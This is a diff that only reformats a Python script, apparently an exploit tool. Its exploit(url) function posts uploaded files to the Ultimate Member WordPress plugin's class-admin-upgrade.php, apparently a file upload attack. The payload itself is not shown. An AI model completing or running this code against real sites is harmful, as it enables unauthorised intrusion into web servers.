@@ -2,19 +2,18 @@ import sys
 import os
 try:
     # The insertion index should be 1 because index 0 is this file
-    sys.path.insert(1, '{}/help'.format(os.getcwd()))  # the type of path is string
+    sys.path.insert(1, '{}/help'.format(
+        os.getcwd()))  # the type of path is string
     # because the system path already have the absolute path to folder a
-    # so it can recognize file_a.py while searching 
+    # so it can recognize file_a.py while searching
     from help.banner import colors
     from help.json_me import json_me
     from help.req import request
-    
+
 except (ModuleNotFoundError, ImportError) as e:
     print("{} fileure".format(type(e)))
 else:
     print("Import succeeded")
-
-
 
 
 def exploit(url):
@@ -33,8 +32,8 @@ def exploit(url):
         }
 
         response = req.post(
-            '{}/wp-content/plugins/ultimate-member/includes/admin/core/class-admin-upgrade.php'.format(
-                url),
+            '{}/wp-content/plugins/ultimate-member/includes/admin/core/class-admin-upgrade.php'
+            .format(url),
             headers=headers,
             files=files,
         )
@@ -53,6 +52,3 @@ def exploit(url):
 
     except Exception as e:
         pass
-
-
-
